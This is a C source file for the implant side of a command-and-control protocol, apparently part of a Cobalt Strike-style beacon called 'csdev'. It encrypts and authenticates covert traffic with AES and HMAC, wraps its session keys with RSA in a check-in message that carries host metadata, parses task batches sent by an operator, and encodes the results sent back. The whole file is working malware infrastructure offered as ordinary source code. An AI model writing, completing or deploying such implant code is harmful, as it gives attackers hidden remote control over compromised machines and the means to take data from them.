/*
 * csdev :: frame.c  --  协议 v2 帧 / TLV / 任务编解码 (植入体侧)
 * ==========================================================================
 * 与 go/proto 包逐字节对齐。任何改动必须同步两侧。
 * ==========================================================================
 */
#include "frame.h"

/* -------------------------------------------------------------- 基础工具 */

static void fmemcpy(void *d, const void *s, unsigned int n)
{
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
}

static void fmemset(void *d, int v, unsigned int n)
{
    unsigned char *dp = (unsigned char *)d;
    while (n--) *dp++ = (unsigned char)v;
}

unsigned int cs_be32(const unsigned char *p)
{
    return ((unsigned int)p[0] << 24) | ((unsigned int)p[1] << 16) |
           ((unsigned int)p[2] << 8)  | (unsigned int)p[3];
}

void cs_put_be32(unsigned char *p, unsigned int v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)v;
}

unsigned short cs_be16(const unsigned char *p)
{
    return (unsigned short)(((unsigned short)p[0] << 8) | (unsigned short)p[1]);
}

void cs_put_be16(unsigned char *p, unsigned short v)
{
    p[0] = (unsigned char)(v >> 8);
    p[1] = (unsigned char)v;
}

/* ------------------------------------------------------------------- TLV */

unsigned int cs_tlv_write(unsigned char *out, unsigned int cap,
                          unsigned short type, const unsigned char *data,
                          unsigned int len)
{
    if (cap < 6u + len) return 0;

    cs_put_be16(out, type);
    cs_put_be32(out + 2, len);
    if (len && data) fmemcpy(out + 6, data, len);
    return 6u + len;
}

int cs_tlv_next(const unsigned char *buf, unsigned int buflen,
                unsigned int *off, cs_tlv *out)
{
    unsigned int o = *off;
    unsigned int len;

    if (o + 6u > buflen) return 0;

    out->type = cs_be16(buf + o);
    len       = cs_be32(buf + o + 2);
    if (o + 6u + len > buflen) return 0;

    out->len  = (unsigned short)0;
    out->data = buf + o + 6;
    *off      = o + 6u + len;

    /* len 字段现为 4 字节, cs_tlv.len 保留 2 字节会造成截断, 故额外提供 */
    if (len <= 0xFFFFu) out->len = (unsigned short)len;
    else out->len = 0xFFFFu;
    return 1;
}

int cs_tlv_find(const unsigned char *buf, unsigned int buflen,
                unsigned short type, const unsigned char **data,
                unsigned int *len)
{
    unsigned int off = 0;
    cs_tlv t;

    while (cs_tlv_next(buf, buflen, &off, &t)) {
        if (t.type == type) {
            if (data) *data = t.data;
            if (len)  *len = t.len;
            return 1;
        }
    }
    return 0;
}

/* -------------------------------------------------------------------- 帧 */

unsigned int cs_frame_seal(cs_session *s, unsigned int flags,
                           const unsigned char *plain, unsigned int plen,
                           unsigned char *out, unsigned int outcap)
{
    unsigned char iv[16];
    unsigned char *ct;
    unsigned int   ctlen, bodylen, total;

    /* 容量检查: 最坏情况明文填充到下一块 */
    if (outcap < CS_FRAME_HDR + 16u + ((plen / 16u) + 1u) * 16u + 32u) return 0;

    if (!csdev_random(iv, 16)) return 0;

    ct    = out + CS_FRAME_HDR + 16;
    ctlen = (unsigned int)aes256_cbc_encrypt(s->aes_key, iv, plain, plen, ct);

    bodylen = 16u + ctlen + 32u;
    total   = CS_FRAME_HDR + bodylen;

    cs_put_be32(out + 0,  CS_PROTO_MAGIC);
    cs_put_be32(out + 4,  s->session_id);
    cs_put_be32(out + 8,  s->tx_seq);
    cs_put_be32(out + 12, flags);
    cs_put_be32(out + 16, bodylen);
    fmemcpy(out + CS_FRAME_HDR, iv, 16);

    /* HMAC 覆盖: 帧头 20 字节 || IV || 密文 */
    hmac_sha256(s->hmac_key, 32, out, CS_FRAME_HDR + 16u + ctlen,
                out + CS_FRAME_HDR + 16u + ctlen);

    s->tx_seq++;
    return total;
}

unsigned int cs_frame_checkin(unsigned char *out, unsigned int outcap,
                              const unsigned char *pubkey_blob, unsigned int pubkey_len,
                              const unsigned char *aes_key, const unsigned char *hmac_key,
                              const char *meta, unsigned int meta_len)
{
    unsigned char plain[512];
    unsigned char ct[256];
    unsigned int  i = 0, ctlen = 0, total;

    if (meta_len > 255u) return 0;
    if (80u + 2u + meta_len > sizeof(plain)) return 0;

    fmemcpy(plain, aes_key, 32);   i  = 32;
    fmemcpy(plain + i, hmac_key, 32); i += 32;
    fmemset(plain + i, 0, 16);         i += 16;   /* iv_seed 保留 */
    plain[i++] = 0x02;                            /* 协议版本 */
    plain[i++] = (unsigned char)meta_len;
    fmemcpy(plain + i, meta, meta_len);
    i += meta_len;

    if (!rsa_encrypt_pub(pubkey_blob, pubkey_len, plain, i, ct, sizeof(ct), &ctlen))
        return 0;
    if (ctlen != 256u) return 0;

    total = CS_FRAME_HDR + ctlen;
    if (outcap < total) return 0;

    cs_put_be32(out + 0,  CS_PROTO_MAGIC);
    cs_put_be32(out + 4,  0);
    cs_put_be32(out + 8,  0);
    cs_put_be32(out + 12, F_CHECKIN);
    cs_put_be32(out + 16, ctlen);
    fmemcpy(out + CS_FRAME_HDR, ct, ctlen);

    /* 明文含密钥材料, 立即擦除 */
    fmemset(plain, 0, sizeof(plain));

    return total;
}

int cs_frame_open(cs_session *s, const unsigned char *raw, unsigned int rawlen,
                  unsigned char *plainbuf, unsigned int plaincap)
{
    unsigned int magic, seq, flags, bodylen, ctlen;
    const unsigned char *body;
    unsigned char mac[32];
    int plen;

    if (rawlen < CS_FRAME_HDR) return -1;

    magic = cs_be32(raw);
    if (magic != CS_PROTO_MAGIC) return -1;

    /* raw+4 = session_id (客户端不需要校验, 以本地记录为准) */
    seq     = cs_be32(raw + 8);
    flags   = cs_be32(raw + 12);
    bodylen = cs_be32(raw + 16);

    if (bodylen > rawlen - CS_FRAME_HDR) return -1;
    body = raw + CS_FRAME_HDR;

    if (flags & F_NOHMAC) {
        return bodylen == 0 ? 0 : -1;
    }

    if (bodylen < 48u) return -1;          /* 16 IV + ≥16 密文 + 32 HMAC */

    ctlen = bodylen - 16u - 32u;
    if ((ctlen & 15u) != 0) return -1;

    /* 重放防御: 下行序号不得倒退 */
    if (seq < s->rx_seq) return -1;
    s->rx_seq = seq + 1;

    hmac_sha256(s->hmac_key, 32, raw, CS_FRAME_HDR + 16u + ctlen, mac);
    if (!csdev_ct_equal(mac, body + 16u + ctlen, 32)) return -1;

    plen = aes256_cbc_decrypt(s->aes_key, body, body + 16, ctlen, plainbuf);
    if (plen < 0) return -1;
    if ((unsigned int)plen > plaincap) return -1;

    return plen;
}

/* ------------------------------------------------------------------ 任务 */

unsigned int cs_batch_count(const unsigned char *batch, unsigned int batchlen)
{
    if (batchlen < 4u) return 0;
    return cs_be32(batch);
}

int cs_batch_task(const unsigned char *batch, unsigned int batchlen,
                  unsigned int idx, cs_task *out)
{
    unsigned int count, off, i;

    if (batchlen < 4u) return 0;
    count = cs_be32(batch);
    if (idx >= count) return 0;

    off = 4u;
    for (i = 0; i <= idx; i++) {
        unsigned int tlen;
        const unsigned char *t;

        if (off + 4u > batchlen) return 0;
        tlen = cs_be32(batch + off);
        off += 4u;
        if (off + tlen > batchlen) return 0;
        t = batch + off;

        if (i == idx) {
            unsigned int ra, glen, k, cp;

            if (tlen < 11u) return 0;

            /* TASK 布局(规范 4.1): [4B id][1B cls][2B alias_len][alias][4B arg_len][arg] */
            out->id  = cs_be32(t);
            out->cls = t[4];
            ra       = cs_be16(t + 5);

            if (7u + ra + 4u > tlen) return 0;

            cp = ra;
            if (cp > sizeof(out->alias) - 1u) cp = sizeof(out->alias) - 1u;
            for (k = 0; k < cp; k++) out->alias[k] = (char)t[7 + k];
            out->alias[cp] = 0;

            glen = cs_be32(t + 7 + ra);
            if (7u + ra + 4u + glen > tlen) return 0;

            out->arg    = t + 7u + ra + 4u;
            out->arglen = glen;
            return 1;
        }

        off += tlen;
    }
    return 0;
}

unsigned int cs_result_encode(unsigned char *out, unsigned int outcap,
                              unsigned int task_id, unsigned char status,
                              const unsigned char *data, unsigned int datalen)
{
    if (outcap < 9u + datalen) return 0;

    cs_put_be32(out, task_id);
    out[4] = status;
    cs_put_be32(out + 5, datalen);
    if (datalen && data) fmemcpy(out + 9, data, datalen);

    return 9u + datalen;
}
